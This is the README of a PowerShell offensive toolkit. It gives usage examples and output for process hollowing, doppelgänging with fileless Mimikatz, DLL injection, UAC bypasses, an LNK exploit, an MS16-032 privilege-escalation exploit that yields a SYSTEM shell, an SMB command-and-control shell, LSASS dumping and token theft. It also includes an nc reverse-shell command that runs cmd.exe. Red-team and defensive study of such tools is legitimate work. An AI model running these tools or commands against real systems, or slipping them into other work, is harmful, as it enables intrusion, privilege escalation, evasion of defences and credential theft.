# PowerShell-Suite

There are great tools and resources online to accomplish most any task in PowerShell, sometimes however, there is a need to script together a util for a specific purpose or to bridge an ontological gap. This is a collection of PowerShell utilities I put together either for fun or because I had a narrow application in mind.

As such the mileage you get out of them may vary but feel free to post issues or fork & adapt!

## Windows API

Some resources to consult on Windows API access from PowerShell:
* FuzzySecurity: [Low-Level Windows API Access From PowerShell](http://www.fuzzysecurity.com/tutorials/24.html)
* Microsoft TechNet: [Use PowerShell to Interact with the Windows API](https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/)
* Exploit Monday: [Accessing the Windows API in PowerShell via internal .NET methods and reflection](http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html)
* Exploit Monday: [Deep Reflection - Defining Structs and Enums in PowerShell](http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html)

### Invoke-Runas

Functionally equivalent to Windows "runas.exe", using Advapi32::CreateProcessWithLogonW.

```
Start cmd with a local account.
C:\PS> Invoke-Runas -User SomeAccount -Password SomePass -Binary C:\Windows\System32\cmd.exe -LogonType 0x1

Start cmd with remote credentials. Equivalent to "/netonly" in runas.
C:\PS> Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -LogonType 0x2
```

### Invoke-NetSessionEnum

Use Netapi32::NetSessionEnum to enumerate active sessions on domain joined machines.

```
Enumerate active sessions on "SomeHostName".
C:\PS> Invoke-NetSessionEnum -HostName SomeHostName
```

### Invoke-CreateProcess

Use Kernel32::CreateProcess to achieve fine-grained control over process creation from PowerShell.

```
Start calc with NONE/SW_SHOWNORMAL/STARTF_USESHOWWINDOW
C:\PS> Invoke-CreateProcess -Binary C:\Windows\System32\calc.exe -CreationFlags 0x0 -ShowWindow 0x1 -StartF 0x1

Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW
C:\PS> Invoke-CreateProcess -Binary C:\Some\Path\nc.exe -Args "-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe" -CreationFlags 0x8000000 -ShowWindow 0x0 -StartF 0x1
```

### Detect-Debug

Showcase a number of techniques to detect the presence of Kernel/User-Mode debuggers from PowerShell.

```
Sample below is x64 Win8, WinDbg attached to PowerShell.
C:\PS> Detect-Debug

[+] Detect Kernel-Mode Debugging
    [?] SystemKernelDebuggerInformation: False

[+] Detect User-Mode Debugging
    [?] CloseHandle Exception: Detected
    [?] IsDebuggerPresent: Detected
    [?] CheckRemoteDebuggerPresent: Detected
    [?] PEB!BeingDebugged: Detected
    [?] PEB!NtGlobalFlag: Detected
    [?] DebugSelf: Detected
```

### Get-Handles

Use NtQuerySystemInformation::SystemHandleInformation to get a list of open handles in the specified process, works on x32/x64.

```
Get handles for PID 2288
C:\PS> Get-Handles -ProcID 2288

[>] PID 2288 --> notepad
[+] Calling NtQuerySystemInformation::SystemHandleInformation
[?] Success, allocated 449300 byte result buffer

[>] Result buffer contains 28081 SystemHandleInformation objects
[>] PID 2288 has 71 handle objects

 PID ObjectType      HandleFlags        Handle KernelPointer AccessMask
 --- ----------      -----------        ------ ------------- ----------
2288 Directory       NONE               0x0004 0x88E629F0    0x00000000
2288 File            NONE               0x0008 0x84560C98    0x00100000
2288 File            NONE               0x000C 0x846164F0    0x00100000
2288 Key             NONE               0x0010 0xA3067A80    0x00020000
2288 ALPC Port       NONE               0x0014 0x8480C810    0x001F0000
2288 Mutant          NONE               0x0018 0x8591FEB8    0x001F0000
2288 Key             NONE               0x001C 0x96719C48    0x00020000
2288 Event           NONE               0x0020 0x850C6838    0x001F0000
...Snip...
```

### Get-TokenPrivs

Open a handle to a process and use Advapi32::GetTokenInformation to list the privileges associated with the process token.

```
Get token privileges for PID 3836
C:\PS> Get-TokenPrivs -ProcID 3836

[?] PID 3836 --> calc
[+] Process handle: 1428
[+] Token handle: 1028
[+] Token has 5 privileges:

LUID Privilege
---- ---------
  19 SeShutdownPrivilege
  23 SeChangeNotifyPrivilege
  25 SeUndockPrivilege
  33 SeIncreaseWorkingSetPrivilege
  34 SeTimeZonePrivilege
```

### Get-Exports

Get-Exports, fetches DLL exports and optionally provides C++ wrapper output (idential to ExportsToC++ but without needing VS and a compiled binary). To do this it reads DLL bytes into memory and then parses them (no LoadLibraryEx). Because of this you can parse x32/x64 DLL's regardless of the bitness of PowerShell.

```
PS C:\> Get-Exports -DllPath C:\Windows\System32\ubpm.dll

[?] 32-bit Image!

[>] Time Stamp: 07/15/2016 18:07:55
[>] Function Count: 16
[>] Named Functions: 16
[>] Ordinal Base: 1
[>] Function Array RVA: 0x2F578
[>] Name Array RVA: 0x2F5B8
[>] Ordinal Array RVA: 0x2F5F8

Ordinal ImageRVA   FunctionName
------- --------   ------------
      1 0x000242A0 UbpmAcquireJobBackgroundMode
      2 0x00004750 UbpmApiBufferFree
      3 0x00004E30 UbpmCloseTriggerConsumer
      4 0x000135E0 UbpmInitialize
      5 0x00008D00 UbpmOpenTriggerConsumer
      6 0x000242C0 UbpmReleaseJobBackgroundMode
      7 0x00013230 UbpmSessionStateChanged
      8 0x000242E0 UbpmTerminate
      9 0x00003BD0 UbpmTriggerConsumerConfigure
     10 0x000040C0 UbpmTriggerConsumerControl
     11 0x00025B10 UbpmTriggerConsumerControlNotifications
     12 0x00025B40 UbpmTriggerConsumerQueryStatus
     13 0x0000E1B0 UbpmTriggerConsumerRegister
     14 0x000043F0 UbpmTriggerConsumerSetDisabledForUser
     15 0x00012480 UbpmTriggerConsumerSetStatePublishingSecurity
     16 0x00005330 UbpmTriggerConsumerUnregister
```

### Get-SystemModuleInformation

Use NtQuerySystemInformation::SystemModuleInformation to get a list of loaded modules, their base address and size (x32/x64).

```
PS C:\> Get-SystemModuleInformation

[+] Calling NtQuerySystemInformation::SystemModuleInformation
[?] Success, allocated 55656 byte result buffer
[?] Result buffer contains 188 SystemModuleInformation objects

ImageBase          ImageSize ImageName
---------          --------- ---------
0xFFFFF80314C0D000 0x749000  \SystemRoot\system32\ntoskrnl.exe
0xFFFFF80315356000 0x6C000   \SystemRoot\system32\hal.dll
0xFFFFF803149ED000 0x9000    \SystemRoot\system32\kd.dll
0xFFFFF88000CB5000 0x5C000   \SystemRoot\System32\drivers\CLFS.SYS
0xFFFFF88000D11000 0x23000   \SystemRoot\System32\drivers\tm.sys
0xFFFFF88000D34000 0x15000   \SystemRoot\system32\PSHED.dll
0xFFFFF88000D49000 0xA000    \SystemRoot\system32\BOOTVID.dll
0xFFFFF88000D53000 0x7F000   \SystemRoot\system32\CI.dll
0xFFFFF88001068000 0x63000   \SystemRoot\System32\drivers\msrpc.sys
0xFFFFF880010CB000 0xC2000   \SystemRoot\system32\drivers\Wdf01000.sys
0xFFFFF8800118D000 0x10000   \SystemRoot\system32\drivers\WDFLDR.SYS
...Snip...
```

### Expose-NetAPI

A crude tool to expose .NET API classes to PowerShell through reflection. This includes internal private classes, such as Microsoft.Win32.UnsafeNativeMethods.

```
# Not all namespaces are available by default in
# PowerShell, MSDN/Google is your friend!
C:\PS> Expose-NetAPI -Search bitmap

[!] Search returned no results, try specifying the namespace!

C:\PS> Expose-NetAPI -Search bitmap -Namespace System.Drawing

Assembly            TypeName                          Name                        Definition
--------            --------                          ----                        ----------
System.Drawing.dll  System.Windows.Forms.DpiHelper    CreateResizedBitmap         static System.Drawing.Bitmap Crea...
System.Drawing.dll  System.Windows.Forms.DpiHelper    ScaleBitmapLogicalToDevice  static void ScaleBitmapLogicalToD...
System.Drawing.dll  System.Drawing.Bitmap             FromHbitmap                 static System.Drawing.Bitmap From...
System.Drawing.dll  System.Drawing.BitmapSelector     CreateBitmap                static System.Drawing.Bitmap Crea...
System.Drawing.dll  System.Drawing.Image              FromHbitmap                 static System.Drawing.Bitmap From...
System.Drawing.dll  System.Drawing.SafeNativeMethods  CreateBitmap                static System.IntPtr CreateBitmap...
System.Drawing.dll  System.Drawing.SafeNativeMethods  CreateCompatibleBitmap      static System.IntPtr CreateCompat...
System.Drawing.dll  System.Drawing.SafeNativeMethods  IntCreateBitmap             static System.IntPtr IntCreateBit...
System.Drawing.dll  System.Drawing.SafeNativeMethods  IntCreateCompatibleBitmap   static System.IntPtr IntCreateCom...
System.Drawing.dll  System.Drawing.Imaging.Metafile   FromHbitmap                 static System.Drawing.Bitmap From...

# Often multiple options available with differing
# definitions. Take care when selecting the desired
# API.
C:\PS> Expose-NetAPI -Search drawbutton |Select Assembly,TypeName,Name |ft

Assembly                  TypeName                                           Name
--------                  --------                                           ----
System.Windows.Forms.dll  System.Windows.Forms.ButtonRenderer                DrawButton
System.Windows.Forms.dll  System.Windows.Forms.ControlPaint                  DrawButton
System.Windows.Forms.dll  System.Windows.Forms.DataGridViewButtonCell+Da...  DrawButton

# Take care when directly calling enable, a number
# of assemblies are not loaded by default!
C:\PS> Expose-NetAPI -Enable -Assembly System.Windows.Forms.dll -TypeName System.Windows.Forms.SafeNativeMethods

[!] Unable to locate specified assembly!

C:\PS> Expose-NetAPI -Load System.Windows.Forms
True

C:\PS> Expose-NetAPI -Enable -Assembly System.Windows.Forms.dll -TypeName System.Windows.Forms.SafeNativeMethods

[+] Created $SystemWindowsFormsSafeNativeMethods!

# Once enabled the TypeName is exposed as a global
# variable and can be used to call any API's it includes!
C:\PS> Expose-NetAPI -Enable -Assembly System.dll -TypeName Microsoft.Win32.UnsafeNativeMethods |Out-Null
C:\PS> Expose-NetAPI -Enable -Assembly System.dll -TypeName Microsoft.Win32.SafeNativeMethods |Out-Null
C:\PS> $ModHandle = $MicrosoftWin32UnsafeNativeMethods::GetModuleHandle("kernel32.dll")
C:\PS> $Kernel32Ref = New-Object System.Runtime.InteropServices.HandleRef([IntPtr]::Zero,$ModHandle)
C:\PS> $Beep = $MicrosoftWin32UnsafeNativeMethods::GetProcAddress($Kernel32Ref, "Beep")
C:\PS> $MicrosoftWin32SafeNativeMethods::MessageBox([IntPtr]::Zero,$("{0:X}" -f [int64]$Beep),"Beep",0)
```

### Get-ProcessMiniDump

Create process dump using Dbghelp::MiniDumpWriteDump.

```
# Elevated user dumping elevated process

C:\PS> (Get-Process lsass).Id
528

C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 528 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
VERBOSE: [?] Running as: Administrator
VERBOSE: [?] Administrator privileges required
VERBOSE: [>] Administrator privileges held
VERBOSE: [>] Process dump success!

C:\PS> $CallResult
True

# low priv user dumping low priv process

C:\PS> (Get-Process calc).Id
2424

C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 2424 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
VERBOSE: [?] Running as: asenath.waite
VERBOSE: [>] Process dump success!

C:\PS> $CallResult
True

# low priv user dumping elevated process
C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 4 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
VERBOSE: [?] Running as: asenath.waite
VERBOSE: [?] Administrator privileges required
VERBOSE: [!] Administrator privileges not held!

C:\PS> $CallResult
False
```

### Get-SystemProcessInformation

Use NtQuerySystemInformation::SystemProcessInformation to get a detailed list of processes and process properties. On close inspection you will find that many process monitors such as Sysinternals Process Explorer or Process Hacker use this information class (in addition to SystemPerformanceInformation, SystemProcessorPerformanceInformation and SystemProcessorCycleTimeInformation).

```
# Return full process listing
C:\PS> Get-SystemProcessInformation

# Return only specific PID
C:\PS> Get-SystemProcessInformation -ProcID 1336

PID                        : 1336
InheritedFromPID           : 1020
ImageName                  : svchost.exe
Priority                   : 8
CreateTime                 : 0d:9h:8m:47s
UserCPU                    : 0d:0h:0m:0s
KernelCPU                  : 0d:0h:0m:0s
ThreadCount                : 12
HandleCount                : 387
PageFaults                 : 7655
SessionId                  : 0
PageDirectoryBase          : 3821568
PeakVirtualSize            : 2097249.796875 MB
VirtualSize                : 2097240.796875 MB
PeakWorkingSetSize         : 11.65625 MB
WorkingSetSize             : 6.2109375 MB
QuotaPeakPagedPoolUsage    : 0.175910949707031 MB
QuotaPagedPoolUsage        : 0.167121887207031 MB
QuotaPeakNonPagedPoolUsage : 0.0151519775390625 MB
QuotaNonPagedPoolUsage     : 0.0137710571289063 MB
PagefileUsage              : 3.64453125 MB
PeakPagefileUsage          : 4.14453125 MB
PrivatePageCount           : 3.64453125 MB
ReadOperationCount         : 0
WriteOperationCount        : 0
OtherOperationCount        : 223
ReadTransferCount          : 0
WriteTransferCount         : 0
OtherTransferCount         : 25010

# Possibly returns multiple processes
# eg: notepad.exe & notepad++.exe
C:\PS> Get-SystemProcessInformation -ProcName note
```


### Get-OSTokenInformation

Get-OSTokenInformation uses a variety of API's to pull in all (accessible) user tokens and queries them for details.

```
# Return full token listing
C:\PS> $OsTokens = Get-OSTokenInformation

C:\PS> $OsTokens.Count
136

C:\PS> $OsTokens[10]

PassMustChange      : N/A
ProcessCompany      : Microsoft Corporation
AuthPackage         : NTLM
TokenType           : TokenPrimary
PID                 : 5876
LastSuccessfulLogon : N/A
Session             : 1
LastFailedLogon     : N/A
ProcessPath         : C:\Windows\system32\backgroundTaskHost.exe
LogonServer         : MSEDGEWIN10
Sid                 : S-1-5-21-4233833229-2203495600-2027003190-1000
ProcessAuthenticode : Valid
User                : MSEDGEWIN10\IEUser
LoginTime           : 4/16/2018 9:52:20 PM
TokenPrivilegeCount : 5
TokenPrivileges     : {SeShutdownPrivilege, SeChangeNotifyPrivilege, SeUndockPrivilege,
                      SeIncreaseWorkingSetPrivilege...}
Process             : backgroundTaskHost
PassLastSet         : 10/17/2017 6:13:19 PM
ImpersonationType   : N/A
TID                 : Primary
TokenGroups         : {MSEDGEWIN10\IEUser, MSEDGEWIN10\None, Everyone, NT AUTHORITY\Local account and member of
                      Administrators group...}
LogonType           : Interactive
GroupCount          : 14
Elevated            : No

# Return brief token listing
C:\PS> Get-OSTokenInformation -Brief

Process               PID TID     Elevated ImpersonationType     User
-------               --- ---     -------- -----------------     ----
ApplicationFrameHost 5820 Primary No       N/A                   MSEDGEWIN10\IEUser
backgroundTaskHost   1076 Primary No       N/A                   MSEDGEWIN10\IEUser
backgroundTaskHost   1960 Primary No       N/A                   MSEDGEWIN10\IEUser
backgroundTaskHost   7860 Primary No       N/A                   MSEDGEWIN10\IEUser
CompatTelRunner       680 Primary Yes      N/A                   NT AUTHORITY\SYSTEM
CompatTelRunner      6916 Primary Yes      N/A                   NT AUTHORITY\SYSTEM
CompatTelRunner      8488 Primary Yes      N/A                   NT AUTHORITY\SYSTEM
svchost              3572 Primary Yes      N/A                   NT AUTHORITY\SYSTEM
svchost              3900 Primary Yes      N/A                   NT AUTHORITY\SYSTEM
svchost              4292 Primary Yes      N/A                   NT AUTHORITY\SYSTEM
svchost              4292 144     No       SecurityImpersonation MSEDGEWIN10\IEUser
svchost              4292 7704    No       SecurityImpersonation MSEDGEWIN10\IEUser
svchost              4292 1404    No       SecurityImpersonation MSEDGEWIN10\IEUser
svchost              4464 Primary No       N/A                   MSEDGEWIN10\IEUser
svchost              4556 Primary No       N/A                   MSEDGEWIN10\IEUser
[... Snip ...]
```

### Native-HardLink

This is a proof-of-concept for NT hard links. There are some advantages, from an offensive perspective, to using NtSetInformationFile to create hard links (as opposed to mklink/CreateHardLink). NtSetInformationFile allows us link to files we don’t have write access to.

```
PS C:\> Native-HardLink -Link C:\Some\Path\Hard.Link -Target C:\Some\Path\Target.file
True
```

## pwnd

### Start-Hollow

This is a proof-of-concept for process hollowing. There is nothing new here except maybe the use of NtCreateProcessEx which has some advantages in that it offers a convenient way to set a parent process and avoids the bothersome Get/SetThreadContext. On the flipside CreateRemoteThreadEx/NtCreateThreadEx are pretty suspicious API's.

```
# Create a Hollow from a PE on disk with explorer as the parent.
# x64 Win10 RS4
C:\PS> Start-Hollow -Sponsor C:\Windows\System32\notepad.exe -Hollow C:\Some\PE.exe -ParentPID 8304 -Verbose
VERBOSE: [?] A place where souls may mend your ailing mind..
VERBOSE: [+] Opened file for access
VERBOSE: [+] Created section from file handle
VERBOSE: [+] Opened handle to the parent => explorer
VERBOSE: [+] Created process from section
VERBOSE: [+] Acquired PBI
VERBOSE: [+] Sponsor architecture is x64
VERBOSE: [+] Sponsor ImageBaseAddress => 7FF69E9F0000
VERBOSE: [+] Allocated space for the Hollow process
VERBOSE: [+] Duplicated Hollow PE headers to the Sponsor
VERBOSE: [+] Duplicated .text section to the Sponsor
VERBOSE: [+] Duplicated .rdata section to the Sponsor
VERBOSE: [+] Duplicated .data section to the Sponsor
VERBOSE: [+] Duplicated .pdata section to the Sponsor
VERBOSE: [+] Duplicated .rsrc section to the Sponsor
VERBOSE: [+] Duplicated .reloc section to the Sponsor
VERBOSE: [+] New process ImageBaseAddress => 40000000
VERBOSE: [+] Created Hollow process parameters
VERBOSE: [+] Allocated memory in the Hollow
VERBOSE: [+] Process parameters duplicated into the Hollow
VERBOSE: [+] Rewrote Hollow->PEB->pProcessParameters
VERBOSE: [+] Created Hollow main thread..
True
```

### Start-Eidolon

This is a proof-of-concept for doppelgänging, which was recently presented by enSilo at BlackHat EU. In simple terms this process involves creating an NTFS transaction from a file on disk (any file will do). Next we overwrite the file in memory, create a section from the modified file and launch a process based on that section. Afterwards we roll back the transaction, leaving the original file unchanged but we end up with a process that appears to be backed by the original file. For a more complete description please review the reference in the script.

```
# Create a doppelgänger from a file on disk with explorer as the parent.
# x64 Win10 RS3
C:\PS> Start-Eidolon -Target C:\Some\File.Path -Eidolon C:\Some\Other\File.Path -ParentPID 12784 -Verbose
VERBOSE: [+] Created transaction object
VERBOSE: [+] Created transacted file
VERBOSE: [+] Overwriting transacted file
VERBOSE: [+] Created section from transacted file
VERBOSE: [+] Rolled back transaction changes
VERBOSE: [+] Opened handle to the parent => explorer
VERBOSE: [+] Created process from section
VERBOSE: [+] Acquired Eidolon PBI
VERBOSE: [+] Eidolon architecture is 64-bit
VERBOSE: [+] Eidolon image base: 0x7FF6A0570000
VERBOSE: [+] Eidolon entry point: 0x7FF6A05E40C8
VERBOSE: [+] Created Eidolon process parameters
VERBOSE: [+] Allocated memory in Eidolon
VERBOSE: [+] Process parameters duplicated into Eidolon
VERBOSE: [+] Rewrote Eidolon->PEB->pProcessParameters
VERBOSE: [+] Created Eidolon main thread..
True

# Create a fileless Mimikatz doppelgänger with PowerShell as the parent.
# x32 Win7
C:\PS> Start-Eidolon -Target C:\Some\File.Path -Mimikatz -Verbose
VERBOSE: [+] Created transaction object
VERBOSE: [+] Created transacted file
VERBOSE: [+] Overwriting transacted file
VERBOSE: [+] Created section from transacted file
VERBOSE: [+] Rolled back transaction changes
VERBOSE: [+] Created process from section
VERBOSE: [+] Acquired Eidolon PBI
VERBOSE: [+] Eidolon architecture is 32-bit
VERBOSE: [+] Eidolon image base: 0x400000
VERBOSE: [+] Eidolon entry point: 0x4572D2
VERBOSE: [+] Created Eidolon process parameters
VERBOSE: [+] Allocated memory in Eidolon
VERBOSE: [+] Process parameters duplicated into Eidolon
VERBOSE: [+] Rewrote Eidolon->PEB->pProcessParameters
VERBOSE: [+] Created Eidolon main thread..
True
```

### Stage-RemoteDll

Stage-RemoteDll is a small function to demonstrate various Dll injection techniques (NtCreateThreadEx / QueueUserAPC / SetThreadContext / SetWindowsHookEx) on 32 and 64 bit architectures. While I have done some input validation & cleanup, this is mostly POC code. Note also that these techniques can easily be repurposed to directly execute shellcode in the remote process.

```
# Boolean return value
C:\PS> $CallResult = Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode NtCreateThreadEx
C:\PS> $CallResult
True

# Verbose output
C:\PS> Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode QueueUserAPC -Verbose
VERBOSE: [+] Using QueueUserAPC
VERBOSE: [>] Opening notepad
VERBOSE: [>] Allocating DLL path memory
VERBOSE: [>] Writing DLL string
VERBOSE: [>] Locating LoadLibraryA
VERBOSE: [>] Getting process threads
VERBOSE: [>] Registering APC's with all threads
VERBOSE:   --> Success, registered APC
VERBOSE:   --> Success, registered APC
VERBOSE:   --> Success, registered APC
VERBOSE:   --> Success, registered APC
VERBOSE: [>] Cleaning up..
True
```

### Export-LNKPwn

Create LNK files to exploit CVE-2017-8464 aka LNK round 3 ;))!

Currently, it is recommended that you create the lnk locally and then move it to the target system because of .Net and PowerShell dependencies. Please refer to the function synopsis for further details.

```
C:\PS> Export-LNKPwn -LNKOutPath C:\Some\Local\Path.lnk -TargetCPLPath C:\Target\CPL\Path.cpl -Type SpecialFolderDataBlock
```

### UAC-TokenMagic

Based on James Forshaw's three part post on UAC, linked below, and possibly a technique used by the CIA!

Essentially we duplicate the token of an elevated process, lower it's mandatory integrity level, use it to create a new restricted token, impersonate it and use the Secondary Logon service to spawn a new process with High IL. Like playing hide-and-go-seek with tokens! ;))

This technique even bypasses the AlwaysNotify setting provided you supply it with a PID for an elevated process.

Targets:
7,8,8.1,10,10RS1,10RS2

```
C:\PS> UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c calc.exe" -ProcPID 1116

[*] Session is not elevated
[*] Successfully acquired regedit handle
[*] Opened process token
[*] Duplicated process token
[*] Initialized MedIL SID
[*] Lowered token mandatory IL
[*] Created restricted token
[*] Duplicated restricted token
[*] Successfully impersonated security context
[*] Magic..
```

### Bypass-UAC

Bypass-UAC provides a framework to perform UAC bypasses based on auto elevating IFileOperation COM object method calls. This is not a new technique, traditionally, this is accomplished by injecting a DLL into “explorer.exe”. This is not desirable because injecting into explorer may trigger security alerts and working with unmanaged DLL’s makes for an inflexible work-flow.

To get around this, Bypass-UAC implements a function which rewrites PowerShell’s PEB to give it the appearance of “explorer.exe”. This provides the same effect because COM objects exclusively rely on Windows’s Process Status API (PSAPI) which reads the process PEB.

```
C:\PS> Bypass-UAC -Method ucmDismMethod

[!] Impersonating explorer.exe!
[+] PebBaseAddress: 0x000007F73E93F000
[!] RtlEnterCriticalSection --> &Peb->FastPebLock
[>] Overwriting &Peb->ProcessParameters.ImagePathName: 0x000000569B5F1780
[>] Overwriting &Peb->ProcessParameters.CommandLine: 0x000000569B5F1790
[?] Traversing &Peb->Ldr->InLoadOrderModuleList doubly linked list
[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x000000569B5F2208
[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x000000569B5F2218
[!] RtlLeaveCriticalSection --> &Peb->FastPebLock

[>] Dropping proxy dll..
[+] 64-bit Yamabiko: C:\Users\b33f\AppData\Local\Temp\yam1730961377.tmp
[>] Creating XML trigger: C:\Users\b33f\AppData\Local\Temp\pac500602004.xml
[>] Performing elevated IFileOperation::MoveItem operation..

[?] Executing PkgMgr..
[!] UAC artifact: C:\Windows\System32\dismcore.dll
[!] UAC artifact: C:\Users\b33f\AppData\Local\Temp\pac500602004.xml
```

### Masquerade-PEB

Masquerade-PEB uses NtQueryInformationProcess to get a handle to powershell's PEB. From there it replaces a number of UNICODE_STRING structs in memory to give powershell the appearance of a different process. Specifically, the function will overwrite powershell's "ImagePathName" & "CommandLine" in _RTL_USER_PROCESS_PARAMETERS and the "FullDllName" & "BaseDllName" in the _LDR_DATA_TABLE_ENTRY linked list.
    
This can be useful as it would fool any Windows work-flows which rely solely on the Process Status API to check process identity.

```
C:\PS> Masquerade-PEB -BinPath C:\Windows\System32\notepad.exe

[?] PID 2756
[+] PebBaseAddress: 0x7FFD3000
[!] RtlEnterCriticalSection --> &Peb->FastPebLock
[>] Overwriting &Peb->ProcessParameters.ImagePathName: 0x002F11F8
[>] Overwriting &Peb->ProcessParameters.CommandLine: 0x002F1200
[?] Traversing &Peb->Ldr->InLoadOrderModuleList doubly linked list
[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x002F1B74
[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x002F1B7C
[!] RtlLeaveCriticalSection --> &Peb->FastPebLock
```

### Invoke-SMBShell

POC shell using named pipes (System.IO.Pipes) as a C2 channel. The SMB traffic is encrypted using AES CBC (code from Empire), the key/pipe are generated randomly by the server on start-up.

**Server:**
```
PS C:\> Invoke-SMBShell

+-------
| Host Name: 0AK
| Named Pipe: tapsrv.5604.yk0DxXvjUD9xwyJ9
| AES Key: q6EKfuJTX93YUnmX
+-------

[>] Waiting for client..


SMB shell: whoami
0ak\b33f

SMB shell: IdontExist
The term 'IdontExist' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.

SMB shell: $PSVersionTable
Name                           Value
----                           -----
PSRemotingProtocolVersion      2.2
BuildVersion                   6.2.9200.17065
PSCompatibleVersions           {1.0, 2.0, 3.0}
PSVersion                      3.0
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
SerializationVersion           1.1.0.1

SMB shell: leave

[!] Client disconnecting..

[>] Waiting for client..


SMB shell: calc
Job SMBJob-dVkIkAkXINjMe09S completed successfully!

SMB shell: exit

[!] Client disconnecting..
[!] Terminating server..

PS C:\>
```

**Client:**
```
# Client disconnected because of "leave" command
PS C:\> Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9
# Client disconnected because "exit" command kills client/server
PS C:\> Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9
```

### Conjure-LSASS

Use the SeDebugPrivilege to duplicate the LSASS access token and impersonate it in the calling thread. If SeDebugPrivilege is disabled the function will re-enable it.

```
Conjure LSASS into our midst! ;)
C:\PS> Conjure-LSASS

[?] SeDebugPrivilege is available!

[+] Current process handle: 852

[>] Calling Advapi32::OpenProcessToken
[+] Token handle with TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY: 2000

[?] SeDebugPrivilege is enabled!

[>] Calling Advapi32::OpenProcessToken --> LSASS
[+] Token handle with TOKEN_IMPERSONATE|TOKEN_DUPLICATE: 1512

[>] Calling Advapi32::DuplicateToken --> LSASS
[+] Duplicate token handle with SecurityImpersonation level: 2008

[>] Calling Advapi32::SetThreadToken
[+] Knock knock .. who's there .. LSASS
[+] User context: SYSTEM

C:\PS> whoami
ERROR: Access is denied.
ERROR: Access is denied.

C:\PS> Get-ChildItem -Path hklm:SAM

    Hive: HKEY_LOCAL_MACHINE\SAM


SKC  VC Name                           Property
---  -- ----                           --------
  3   2 SAM                            {C, ServerDomainUpdates}
```

### Invoke-MS16-032

PowerShell implementation of MS16-032. The exploit targets all vulnerable operating systems that support PowerShell v2+. Credit for the discovery of the bug and the logic to exploit it go to James Forshaw (@tiraniddo).
    
Targets:

* Win7-Win10 & 2k8-2k12 <== 32/64 bit!
* Tested on x32 Win7, x64 Win8, x64 2k12R2

==> Not tested on Vista with PowerShell v1, let me know what happens if you are able to check this!

```
Sit back and watch the pwn!
C:\PS> Invoke-MS16-032
         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 956

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 964
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

```

### Subvert-PE

Inject shellcode into a PE image while retaining the PE functionality.

For additional information, please refer to:

* FuzzySecurity: [Powershell PE Injection, this is not the Calc you are looking for!](http://www.fuzzysecurity.com/tutorials/20.html)

```
Analyse the PE header and hexdump the region of memory where shellcode would be injected.
C:\PS> Subvert-PE -Path C:\Path\To\PE.exe

Same as above but continue to inject shellcode and overwrite the binary.
C:\PS> Subvert-PE -Path C:\Path\To\PE.exe -Write
```

## Utility

### Get-LimitChildItem

Depth limited wrapper for Get-ChildItem with basic filter functionality.

```
# UNC path txt file search
PS C:\> Get-LimitChildItem -Path "\\192.168.84.129\C$\Program Files\" -MaxDepth 5 -Filter "*.txt"
\\192.168.84.129\C$\Program Files\Windows Defender\ThirdPartyNotices.txt
\\192.168.84.129\C$\Program Files\VMware\VMware Tools\open_source_licenses.txt
\\192.168.84.129\C$\Program Files\VMware\VMware Tools\vmacthlp.txt
\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceAmharic.txt
\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceArray.txt
\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceDaYi.txt
\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceTigrinya.txt
\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceYi.txt

# Local wildcard *ini* search
PS C:\> Get-LimitChildItem -Path C:\ -MaxDepth 3 -Filter "*ini*"
C:\Windows\system.ini
C:\Windows\win.ini
C:\Windows\Boot\BootDebuggerFiles.ini
C:\Windows\Fonts\desktop.ini
C:\Windows\INF\mdmminij.inf
C:\Windows\Media\Windows Minimize.wav
C:\Windows\PolicyDefinitions\PenTraining.admx
C:\Windows\PolicyDefinitions\WinInit.admx
C:\Windows\System32\dwminit.dll
C:\Windows\System32\ie4uinit.exe
C:\Windows\System32\ieuinit.inf
C:\Windows\System32\PerfStringBackup.INI
C:\Windows\System32\rdpinit.exe
C:\Windows\System32\regini.exe
C:\Windows\System32\secinit.exe
C:\Windows\System32\tcpmon.ini
